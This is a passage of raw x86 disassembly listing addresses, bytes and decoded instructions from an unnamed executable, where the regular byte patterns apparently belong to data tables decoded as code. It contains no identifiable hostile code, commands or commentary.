  406fa5:	01 66 21             	add    %esp,0x21(%esi)
  406fa8:	1a 05 89 02 2c 21    	sbb    0x212c0289,%al
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 fa                	add    %dl,%bh
  406fb3:	0e                   	push   %cs
  406fb4:	20 05 89 02 0a 25    	and    %al,0x250a0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 6a 23 27    	add    0x27236a02(%ecx),%al
  406fc1:	05 c1 02 fe 1d       	add    $0x1dfe02c1,%eax
  406fc6:	30 05 c9 02 48 10    	xor    %al,0x104802c9
  406fcc:	c7 00 91 02 a7 25    	movl   $0x25a70291,(%eax)
  406fd2:	35 05 c1 01 66       	xor    $0x6601c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 5d 12       	add    $0x125d0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 47 21       	add    $0x214702d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	82 10 3e             	adcb   $0x3e,(%eax)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 9b 1e 4c 05 d9    	add    -0x26fab3e2(%ebx),%bl
  406ff3:	02 ea                	add    %dl,%ch
  406ff5:	1f                   	pop    %ds
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 40 0f c3       	mov    0xc30f4002,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 66 21             	add    %esp,0x21(%esi)
  407002:	01 05 99 02 9b 1e    	add    %eax,0x1e9b0299
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 ce                	add    %dh,%cl
  40700d:	0f 6b 01             	packssdw (%ecx),%mm0
  407010:	a1 02 b0 15 c3       	mov    0xc315b002,%eax
  407015:	00 a1 02 50 0f c7    	add    %ah,-0x38f0affe(%ecx)
  40701b:	00 89 02 2e 15 4b    	add    %cl,0x4b152e02(%ecx)
  407021:	02 89 02 21 12 4b    	add    0x4b122102(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	78 23                	js     0x40704f
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	61                   	popa
  407031:	26 c3                	es ret
  407033:	00 a1 02 4b 23 c7    	add    %ah,-0x38dcb4fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 9b 1e 6b 01 f9    	add    -0x6fe94e2(%ebx),%bl
  407041:	02 b3 12 23 02 01    	add    0x1022312(%ebx),%dh
  407047:	03 9b 1e 0e 00 01    	add    0x1000e1e(%ebx),%ebx
  40704d:	03 6c 0f 47          	add    0x47(%edi,%ecx,1),%ebp
  407051:	02 c1                	add    %cl,%al
  407053:	01 35 1e 47 02 c1    	add    %esi,0xc102471e
  407059:	01 93 20 42 02 09    	add    %edx,0x9024220(%ebx)
  40705f:	03 9b 1e 6b 01 09    	add    0x9016b1e(%ebx),%ebx
  407065:	03 c5                	add    %ebp,%eax
  407067:	21 6a 05             	and    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	83 1e 70             	sbbl   $0x70,(%esi)
  40706f:	05 19 03 e9 22       	add    $0x22e90319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	c2 18 7c             	ret    $0x7c18
  40707b:	05 c1 01 44 22       	add    $0x224401c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 a7 23 bf 01 81    	add    -0x7efe40dd(%edi),%esp
  407089:	02 56 0e             	add    0xe(%esi),%dl
  40708c:	86 05 29 03 44 00    	xchg   %al,0x440329
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	38 23                	cmp    %ah,(%ebx)
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 88 0f c3 00 59    	add    %ecx,0x5900c30f(%eax)
  4070a1:	01 5c 0f c3          	add    %ebx,-0x3d(%edi,%ecx,1)
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	d8 19                	fcomps (%ecx)
  4070aa:	93                   	xchg   %eax,%ebx
  4070ab:	05 c1 01 66 21       	add    $0x216601c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 9b 1e       	add    $0x1e9b0349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	36 04 cd             	ss add $0xcd,%al
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	80 15 75 01 69 00 9b 	adcb   $0x9b,0x690175
  4070c7:	1e                   	push   %ds
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 c6                	add    %dh,%al
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	45                   	inc    %ebp
  4070d3:	0d aa 05 c1 01       	or     $0x1c105aa,%eax
  4070d8:	f3 14 b0             	repz adc $0xb0,%al
  4070db:	05 c1 01 f6 1d       	add    $0x1df601c1,%eax
  4070e0:	47                   	inc    %edi
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 96 0d bd 05 59    	add    %edx,0x5905bd0d(%esi)
  4070e9:	01 cb                	add    %ecx,%ebx
  4070eb:	18 1d 00 61 03 c6    	sbb    %bl,0xc6036100
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	9d                   	popf
  4070f7:	15 c3 00 b1 02       	adc    $0x2b100c3,%eax
  4070fc:	ac                   	lods   %ds:(%esi),%al
  4070fd:	0f c3 05 59 03 be 0f 	movnti %eax,0xfbe0359
  407104:	c3                   	ret
  407105:	05 59 03 c6 14       	add    $0x14c60359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	f5                   	cmc
  40710f:	22 c9                	and    %cl,%cl
  407111:	05 79 03 9b 1e       	add    $0x1e9b0379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 c1 0e       	add    $0xec10379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 34 10       	add    $0x103400c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 34 10             	add    %dh,(%eax,%edx,1)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 9b 1e 36 02 0c    	add    0xc02361e(%ebx),%ebx
  407131:	00 9b 1e 0e 00 0c    	add    %bl,0xc000e1e(%ebx)
  407137:	00 cc                	add    %cl,%ah
  407139:	0b f5                	or     %ebp,%esi
  40713b:	05 0c 00 2e 23       	add    $0x232e000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	76 25                	jbe    0x40716b
  407146:	fb                   	sti
  407147:	05 c1 01 b7 19       	add    $0x19b701c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 c2                	add    %al,%dl
  407151:	20 11                	and    %dl,(%ecx)
  407153:	06                   	push   %es
  407154:	51                   	push   %ecx
  407155:	00 2f                	add    %ch,(%edi)
  407157:	02 17                	add    (%edi),%dl
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	7e 26                	jle    0x40718a
  407164:	1d 06 69 00 9b       	sbb    $0x9b006906,%eax
  407169:	1e                   	push   %ds
  40716a:	01 03                	add    %eax,(%ebx)
  40716c:	61                   	popa
  40716d:	00 9b 1e 2d 06 91    	add    %bl,-0x6ef9d2e2(%ebx)
  407173:	03 34 10             	add    (%eax,%edx,1),%esi
  407176:	0e                   	push   %cs
  407177:	00 99 03 9b 1e 56    	add    %bl,0x561e9b03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 47 14             	add    0x14(%edi),%eax
  407182:	35 06 81 02 cb       	xor    $0xcb028106,%eax
  407187:	0d 0a 00 91 02       	or     $0x291000a,%eax
  40718c:	9a 25 35 05 91 02 5d 	lcall  $0x5d02,$0x91053525
  407193:	12 43 06             	adc    0x6(%ebx),%al
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	22 0e                	and    (%esi),%cl
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 9a 25 54    	add    0x54259a02(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 54 12 7c          	add    0x7c(%edx,%edx,1),%dl
  4071a7:	05 91 02 48 12       	add    $0x12480291,%eax
  4071ac:	6b 01 91             	imul   $0xffffff91,(%ecx),%eax
  4071af:	02 a7 25 5e 06 91    	add    -0x6ef9a1db(%edi),%ah
  4071b5:	02 11                	add    (%ecx),%dl
  4071b7:	0e                   	push   %cs
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 cc                	add    %cl,%ah
  4071bd:	0b f5                	or     %ebp,%esi
  4071bf:	05 b9 03 81 23       	add    $0x238103b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	83 1e 92             	sbbl   $0xffffff92,(%esi)
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	e9 22 a4 06 1c       	jmp    0x1c4715f5
  4071d3:	00 82 12 a9 06 24    	add    %al,0x2406a912(%edx)
  4071d9:	00 a7 23 bf 01 c9    	add    %ah,-0x36fe40dd(%edi)
  4071df:	03 a5 19 b3 06 c9    	add    -0x36f94ce7(%ebp),%esp
  4071e5:	03 c7                	add    %edi,%eax
  4071e7:	0b b9 06 d1 03 0b    	or     0xb03d106(%ecx),%edi
  4071ed:	10 c1                	adc    %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	9e                   	sahf
  4071f3:	0d c8 06 d9 03       	or     $0x3d906c8,%eax
  4071f8:	96                   	xchg   %eax,%esi
  4071f9:	0e                   	push   %cs
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 63 10             	add    0x10(%ebx),%esp
  407200:	d8 06                	fadds  (%esi)
  407202:	01 04 f7             	add    %eax,(%edi,%esi,8)
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	63 10                	arpl   %edx,(%eax)
  40720c:	17                   	pop    %ss
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	d4 21                	aam    $0x21
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	2e 0e                	cs push %cs
  407218:	3b 07                	cmp    (%edi),%eax
  40721a:	1c 00                	sbb    $0x0,%al
  40721c:	9b                   	fwait
  40721d:	1e                   	push   %ds
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 bc 26 84 00 21 04 	add    %edi,0x4210084(%esi,%eiz,1)
  407228:	9b                   	fwait
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 9b                	add    $0x9b,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 f7             	sub    %eax,(%edi,%esi,8)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 a8 14 93 01 49    	add    %ebp,0x49019314(%eax)
  40723f:	04 9b                	add    $0x9b,%al
  407241:	1e                   	push   %ds
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 9b 1e 0e 00 31    	add    0x31000e1e(%ebx),%bl
  40724b:	04 9b                	add    $0x9b,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	08 13                	or     %dl,(%ebx)
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 a5                	add    $0xa5,%al
  407259:	12 01                	adc    (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	ad                   	lods   %ds:(%esi),%eax
  40725f:	0d 7a 07 51 04       	or     $0x451077a,%eax
  407264:	3b 14 81             	cmp    (%ecx,%eax,4),%edx
  407267:	07                   	pop    %es
  407268:	51                   	push   %ecx
  407269:	04 92                	add    $0x92,%al
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	03 09                	add    (%ecx),%ecx
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	c0 1e 88             	rcrb   $0x88,(%esi)
  407279:	07                   	pop    %es
  40727a:	39 04 9b             	cmp    %eax,(%ebx,%ebx,4)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 f5                	add    $0xf5,%al
  407283:	08 31                	or     %dh,(%ecx)
  407285:	02 39                	add    (%ecx),%bh
  407287:	04 0d                	add    $0xd,%al
  407289:	17                   	pop    %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	9b                   	fwait
  40728f:	1e                   	push   %ds
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 76 25             	add    0x25(%esi),%dh
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 80 15 9a 07 79    	add    0x79079a15(%eax),%eax
  40729f:	04 9b                	add    $0x9b,%al
  4072a1:	1e                   	push   %ds
  4072a2:	6b 01 51             	imul   $0x51,(%ecx),%eax
  4072a5:	04 fc                	add    $0xfc,%al
  4072a7:	08 2b                	or     %ch,(%ebx)
  4072a9:	02 51 04             	add    0x4(%ecx),%dl
  4072ac:	b0 1e                	mov    $0x1e,%al
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 bc             	roll   $0xbc,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	4e                   	dec    %esi
  4072b9:	26 be 07 91 04 66    	es mov $0x66049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	9b                   	fwait
  4072c5:	1e                   	push   %ds
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 72 21             	add    %esi,0x21(%edx)
  4072cc:	f9                   	stc
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 f7                	add    %bh,%dh
  4072d1:	1f                   	pop    %ds
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	f7 1f                	negl   (%edi)
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 9b 1e 0e    	add    %ebp,0xe1e9b00(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	c2 18 06             	ret    $0x618
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	2e 23 f4             	cs and %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	ec                   	in     (%dx),%al
  4072ef:	1c 0e                	sbb    $0xe,%al
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 66 20             	add    %esp,0x20(%esi)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 3e                	add    %bh,(%esi)
  4072fb:	12 28                	adc    (%eax),%ch
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	f7 1f                	negl   (%edi)
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	5d                   	pop    %ebp
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 1b                	add    %ebx,(%ebx)
  40730d:	19 47 02             	sbb    %eax,0x2(%edi)
  407310:	a9 04 42 10 37       	test   $0x37104204,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	5d                   	pop    %ebp
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 5d 00             	add    %ebx,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	5d                   	pop    %ebp
  407325:	00 46 08             	add    %al,0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 66 00             	add    %esp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	42                   	inc    %edx
  407331:	10 52 08             	adc    %dl,0x8(%edx)
  407334:	51                   	push   %ecx
  407335:	01 66 00             	add    %esp,0x0(%esi)
  407338:	57                   	push   %edi
  407339:	08 51 01             	or     %dl,0x1(%ecx)
  40733c:	66 00 5c 08 51       	data16 add %bl,0x51(%eax,%ecx,1)
  407341:	01 66 00             	add    %esp,0x0(%esi)
  407344:	61                   	popa
  407345:	08 51 01             	or     %dl,0x1(%ecx)
  407348:	4d                   	dec    %ebp
  407349:	0e                   	push   %cs
  40734a:	68 08 b1 04 42       	push   $0x4204b108
  40734f:	10 6d 08             	adc    %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 f7                	add    %bh,%dh
  407355:	1f                   	pop    %ds
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 58 26             	add    0x26(%eax),%ebx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	9b                   	fwait
  407361:	1e                   	push   %ds
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 35             	roll   $0x35,(%eax)
  407367:	12 f4                	adc    %ah,%dh
  407369:	01 89 01 9b 1e 6b    	add    %ecx,0x6b1e9b01(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 b6 08 49 02 b3    	add    %dh,-0x4cfdb6f8(%esi)
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 4d       	mov    $0x4d024908,%ebp
  40737f:	0e                   	push   %cs
  407380:	c4 08                	les    (%eax),%ecx
  407382:	49                   	dec    %ecx
  407383:	02 3b                	add    (%ebx),%bh
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	5d                   	pop    %ebp
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	77 00                	ja     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 66 00             	add    0x0(%esi),%ah
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 f7                	add    %bh,%dh
  40739d:	1f                   	pop    %ds
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 9b             	roll   $1,(%ebx,%ebx,4)
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 4e 08             	add    %cl,0x8(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 fd                	add    %bh,%ch
  4075c3:	07                   	pop    %es
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 50 0a             	add    %dl,0xa(%eax)
  4075ca:	a9 00 00 00 d8       	test   $0xd8000000,%eax
  4075cf:	23 ae 00 00 00 b7    	and    -0x49000000(%esi),%ebp
  4075d5:	00 ae 00 00 00 e4    	add    %ch,-0x1c000000(%esi)
  4075db:	1a b2 00 00 00 f0    	sbb    -0x10000000(%edx),%dh
  4075e1:	06                   	push   %es
  4075e2:	b7 00                	mov    $0x0,%bh
  4075e4:	00 00                	add    %al,(%eax)
  4075e6:	95                   	xchg   %eax,%ebp
  4075e7:	13 bb 00 00 00 99    	adc    -0x67000000(%ebx),%edi
  4075ed:	24 b2                	and    $0xb2,%al
  4075ef:	00 00                	add    %al,(%eax)
  4075f1:	00 58 15             	add    %bl,0x15(%eax)
  4075f4:	bf 00 00 00 02       	mov    $0x2000000,%edi
  4075f9:	02 b7 00 00 00 dd    	add    -0x23000000(%edi),%dh
  4075ff:	1c c3                	sbb    $0xc3,%al
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 94 09 f8 01 00 00 	add    %dl,0x1f8(%ecx,%ecx,1)
  40760a:	8e 07                	mov    (%edi),%es
  40760c:	fe 01                	incb   (%ecx)
  40760e:	00 00                	add    %al,(%eax)
  407610:	eb 05                	jmp    0x407617
  407612:	69 02 00 00 6b 08    	imul   $0x86b0000,(%edx),%eax
  407618:	6d                   	insl   (%dx),%es:(%edi)
  407619:	02 00                	add    (%eax),%al
  40761b:	00 4c 15 71          	add    %cl,0x71(%ebp,%edx,1)
  40761f:	02 00                	add    (%eax),%al
  407621:	00 15 01 75 02 00    	add    %dl,0x27501
  407627:	00 dc                	add    %bl,%ah
